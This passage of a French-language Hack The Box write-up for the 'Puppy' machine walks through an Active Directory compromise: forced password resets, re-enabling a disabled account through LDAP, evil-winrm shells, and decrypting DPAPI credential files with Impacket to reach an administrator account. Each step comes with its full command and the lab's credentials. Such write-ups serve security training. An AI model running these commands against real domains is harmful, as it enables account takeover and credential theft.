+        data-srcset="/images/Puppy/image11.png, /images/Puppy/image11.png 1.5x, /images/Puppy/image11.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image11.png"
+        title="image.png" width="1116" height="628" /></p>
+<p>Je change donc le mot de passe de <code>adam.silver</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net rpc password <span class="s2">&#34;adam.silver&#34;</span> <span class="s2">&#34;newP@ssword2025&#34;</span> -U <span class="s2">&#34;puppy.htb&#34;</span>/<span class="s2">&#34;ant.edwards&#34;</span>%<span class="s1">&#39;Antman2025!&#39;</span> -S <span class="s2">&#34;dc.puppy.htb&#34;</span></span></span></code></pre></div></div>
+<h3 id="enable-adamsilver">Enable Adam.Silver</h3>
+<p>En essayant de me connecte en tant qu’<code>Adam.silver</code>, je vois que ce compte est désactivé.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.70 -u adam.silver -p <span class="s1">&#39;newP@ssword2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image12.png"
+        data-srcset="/images/Puppy/image12.png, /images/Puppy/image12.png 1.5x, /images/Puppy/image12.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image12.png"
+        title="image.png" width="1813" height="278" /></p>
+<p>Avec <code>ldapsearch</code>, je vois bien que la valeur du  <code>userAccountControl</code> ****est ****<code>66050</code> ****qui est un compte désactivé normal avec l&rsquo;indicateur défini sur le mot de passe n&rsquo;expire jamais. <code>512</code> est la valeur du <code>userAccountControl</code> d’un compte actif.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://10.129.219.27 -D <span class="s2">&#34;ant.edwards@puppy.htb&#34;</span> -w <span class="s1">&#39;Antman2025!&#39;</span> -b <span class="s2">&#34;DC=puppy,DC=htb&#34;</span> <span class="s2">&#34;(sAMAccountName=adam.silver)&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image13.png"
+        data-srcset="/images/Puppy/image13.png, /images/Puppy/image13.png 1.5x, /images/Puppy/image13.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image13.png"
+        title="image.png" width="1633" height="1027" /></p>
+<p>Pour le réactiver, je ne vais pas le faire avec <code>bloodyAD</code> comme je l’ai déjà fais sur d’autres machines, je vais le faire en utilisant une nouvelle méthode que j’avais apprise lorsque je faisais cette machine. Elle consiste à d’abord créer un fichier <code>.ldif</code> que je vais nommé <code>enable-adam.ldif</code> avec les informations suivantes :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Adam D. Silver,CN<span class="o">=</span>USERS,DC<span class="o">=</span>PUPPY,DC<span class="o">=</span>HTB
+</span></span><span class="line"><span class="cl">changetype: modify
+</span></span><span class="line"><span class="cl">replace: userAccountControl
+</span></span><span class="line"><span class="cl">userAccountControl: <span class="m">512</span></span></span></code></pre></div></div>
+<p>Puis avec l’outil <code>ldapmodify</code>, j’active le compte <code>adam.silver</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapmodify -x -D <span class="s2">&#34;ant.edwards@puppy.htb&#34;</span> -w <span class="s1">&#39;Antman2025!&#39;</span> -H ldap://10.129.219.27 -f enable-adam.ldif</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image14.png"
+        data-srcset="/images/Puppy/image14.png, /images/Puppy/image14.png 1.5x, /images/Puppy/image14.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image14.png"
+        title="image.png" width="1268" height="271" /></p>
+<p><code>adam.silver</code> est bien activé. La valeur du <code>userAccountControl</code> est bien <code>512</code> maintenant.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://10.129.219.27 -D <span class="s2">&#34;ant.edwards@puppy.htb&#34;</span> -w <span class="s1">&#39;Antman2025!&#39;</span> -b <span class="s2">&#34;DC=puppy,DC=htb&#34;</span> <span class="s2">&#34;(sAMAccountName=adam.silver)&#34;</span> userAccountControl</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image15.png"
+        data-srcset="/images/Puppy/image15.png, /images/Puppy/image15.png 1.5x, /images/Puppy/image15.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image15.png"
+        title="image.png" width="1890" height="811" /></p>
+<p>Avec les scripts, qui réinitialisent tout, je change encore le mot de passe. Cette fois ci, la connexion se fait bien et je vois que je peux avoir une shell avec <code>evil-winrm</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image16.png"
+        data-srcset="/images/Puppy/image16.png, /images/Puppy/image16.png 1.5x, /images/Puppy/image16.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image16.png"
+        title="image.png" width="1818" height="398" /></p>
+<h3 id="evil-winrm">Evil-WinRM</h3>
+<p>J’obiens alors un shell en tant que <code>adam.silver</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.129.219.27 -u adam.silver -p <span class="s1">&#39;newP@ssword2025&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image17.png"
+        data-srcset="/images/Puppy/image17.png, /images/Puppy/image17.png 1.5x, /images/Puppy/image17.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image17.png"
+        title="image.png" width="1110" height="555" /></p>
+<h2 id="shell-as-stephcooper">Shell as Steph.Cooper</h2>
+<h3 id="backups">Backups</h3>
+<p>A la racine, se trouve un dossier <code>Backups</code>, contenant une archive qui semble être celle d’un site web. Je la télécharge sur ma machine.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image18.png"
+        data-srcset="/images/Puppy/image18.png, /images/Puppy/image18.png 1.5x, /images/Puppy/image18.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image18.png"
+        title="image.png" width="973" height="797" /></p>
+<p>Puis je la dézippe.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image19.png"
+        data-srcset="/images/Puppy/image19.png, /images/Puppy/image19.png 1.5x, /images/Puppy/image19.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image19.png"
+        title="image.png" width="662" height="426" /></p>
+<p>S’y trouve un dossier <code>puppy</code> dans lequel se trouve une sauvegarde d’un fichier de configuration LDAP.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image20.png"
+        data-srcset="/images/Puppy/image20.png, /images/Puppy/image20.png 1.5x, /images/Puppy/image20.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image20.png"
+        title="image.png" width="1561" height="456" /></p>
+<p>S’y trouvent les identifiants de <code>steph.cooper</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user : steph.cooper
+</span></span><span class="line"><span class="cl">password : ChefSteph2025!</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image21.png"
+        data-srcset="/images/Puppy/image21.png, /images/Puppy/image21.png 1.5x, /images/Puppy/image21.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image21.png"
+        title="image.png" width="825" height="632" /></p>
+<h3 id="evil-winrm-1">Evil-WinRM</h3>
+<p>Je me connecte ensuite avec <code>evil-winrm</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image22.png"
+        data-srcset="/images/Puppy/image22.png, /images/Puppy/image22.png 1.5x, /images/Puppy/image22.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image22.png"
+        title="image.png" width="1810" height="322" /></p>
+<h2 id="shell-as-stephcooper_adm">Shell as Steph.Cooper_adm</h2>
+<h3 id="dpapi">DPAPI</h3>
+<p>A partir du répertoire personnel de <code>Steph.Cooper</code>, je trouve des fichiers contenants des identifiants.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dir -Force C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials<span class="se">\
+</span></span></span><span class="line"><span class="cl">dir -Force C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\C</span>redentials<span class="err">\</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image23.png"
+        data-srcset="/images/Puppy/image23.png, /images/Puppy/image23.png 1.5x, /images/Puppy/image23.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image23.png"
+        title="image.png" width="1148" height="622" /></p>
+<p>Je localise aussi la masterkey.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dir -Force C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\
+</span></span></span><span class="line"><span class="cl">dir -Force C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-1487982659-1829050783-2281216199-1107</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image24.png"
+        data-srcset="/images/Puppy/image24.png, /images/Puppy/image24.png 1.5x, /images/Puppy/image24.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image24.png"
+        title="image.png" width="1639" height="667" /></p>
+<p>Je télécharge alors tous ces fichiers sur ma machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">download <span class="s2">&#34;C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&#34;</span>
+</span></span><span class="line"><span class="cl">download <span class="s2">&#34;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9&#34;</span>
+</span></span><span class="line"><span class="cl">download <span class="s2">&#34;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image25.png"
+        data-srcset="/images/Puppy/image25.png, /images/Puppy/image25.png 1.5x, /images/Puppy/image25.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image25.png"
+        title="image.png" width="1904" height="878" /></p>
+<p>Malgré les erreurs affichées, le téléchargement s’est bien effectué.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image26.png"
+        data-srcset="/images/Puppy/image26.png, /images/Puppy/image26.png 1.5x, /images/Puppy/image26.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image26.png"
+        title="image.png" width="932" height="245" /></p>
+<p>Avec le module <code>dpapi</code> de <code>Impacket</code>, je déchiffre d’abord la masterkey. Ce qui me donne la clé permettant d’accéder au contenu des deux autres fichiers.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password ChefSteph2025!</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image27.png"
+        data-srcset="/images/Puppy/image27.png, /images/Puppy/image27.png 1.5x, /images/Puppy/image27.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image27.png"
+        title="image.png" width="1839" height="412" /></p>
+<p>L’un des fichiers contient les identifiants de <code>steph.cooper_adm</code>  qui est un membre du groupe <code>Administrators</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image28.png"
+        data-srcset="/images/Puppy/image28.png, /images/Puppy/image28.png 1.5x, /images/Puppy/image28.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image28.png"
+        title="image.png" width="1895" height="401" /></p>
+<h3 id="evil-winrm-2">Evil-WinRM</h3>
+<p>Les identifiants sont valides et je peux obtenir un shell en tant que <code>steph.cooper_adm</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i puppy.htb -u steph.cooper_adm -p <span class="s1">&#39;FivethChipOnItsWay2025!&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Puppy/image29.png"
+        data-srcset="/images/Puppy/image29.png, /images/Puppy/image29.png 1.5x, /images/Puppy/image29.png 2x"
+        data-sizes="auto"
+        alt="/images/Puppy/image29.png"
+        title="image.png" width="1808" height="446" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/puppy/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/puppy/" data-title="Puppy" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,GenericAll,GenericWrite,KeepassXC,DPAPI"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/genericall/">GenericAll</a>,&nbsp;<a href="/tags/genericwrite/">GenericWrite</a>,&nbsp;<a href="/tags/keepassxc/">KeepassXC</a>,&nbsp;<a href="/tags/dpapi/">DPAPI</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/querier/" class="prev" rel="prev" title="Querier"><i class="fas fa-angle-left" aria-hidden="true"></i>Querier</a>
+            <a href="/outbound/" class="next" rel="next" title="OutBound">OutBound<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
